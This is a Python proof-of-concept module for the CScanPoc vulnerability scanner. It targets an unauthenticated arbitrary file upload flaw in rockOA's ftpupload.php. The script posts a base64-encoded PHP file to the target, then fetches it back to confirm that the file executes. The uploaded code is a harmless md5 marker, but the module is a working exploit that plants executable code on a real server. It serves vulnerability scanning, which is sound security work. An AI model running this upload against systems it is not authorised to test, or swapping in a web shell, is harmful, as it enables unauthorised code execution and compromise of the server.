# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'rockOA_0001'  # 平台漏洞编号，留空
    name = 'rockOA 任意文件上传'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.FILE_UPLOAD  # 漏洞类型
    disclosure_date = '2015-12-11'  # 漏洞公布时间
    desc = '''
        rockOA为企业构建一个基于互联网的企业管理平台, 对企业中沟通与互动，协作与管理的全方位整合，并且免费开源系统，二次开发更快捷，即时推送审批，掌上APP手机办公。
        rockOA ftpupload.php中函数没有用户身份判定，也没有文件类型过滤，导致任意文件上传。
    '''  # 漏洞描述
    ref = 'http://xiaomange.meximas.com/?p=317'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'rockOA'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '6f7f97e7-66dd-4671-b33b-98a6098c4b95'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-18'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            hh = hackhttp.hackhttp()
            url = self.target + "/mode/upload/ftpupload.php"
            # proxy=('127.0.0.1',8080)
            # upload file
            data = "filepath=&filename=test.php&content=PD9waHAgZWNobyBtZDUoMSk/Pg=="
            code, head, res, errcode, finalurl = hh.http(url, post=data)
            # visit  file
            url1 = self.target + "/test.php"
            code, head, res, errcode, finalurl = hh.http(url1)

            if code == 200 and "c4ca4238a0b923820dcc509a6f75849b" in res:
                #security_hole('file upload Vulnerable:'+url)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
